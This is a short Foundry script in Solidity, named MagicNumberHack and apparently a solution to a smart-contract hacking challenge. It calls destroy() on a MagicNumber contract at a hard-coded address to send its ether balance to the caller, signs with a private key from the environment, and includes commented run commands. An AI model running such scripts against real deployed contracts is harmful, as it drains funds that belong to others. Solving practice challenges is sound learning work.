// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {MagicNumber} from "../src/MagicNumber.sol";

contract MagicNumberHack is Script {
    MagicNumber public magicNumber =
        MagicNumber(0xd22bE6dd648403D88Dd32A69Baa7c7aF478396c4);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("balance before hack", address(magicNumber).balance);

        magicNumber.destroy(payable(msg.sender));

        console.log("balance after hack", address(magicNumber).balance);

        vm.stopBroadcast();
    }
}

// forge script script/MagicNumber.s.sol -vv
// forge script script/MagicNumber.s.sol -vv  --broadcast
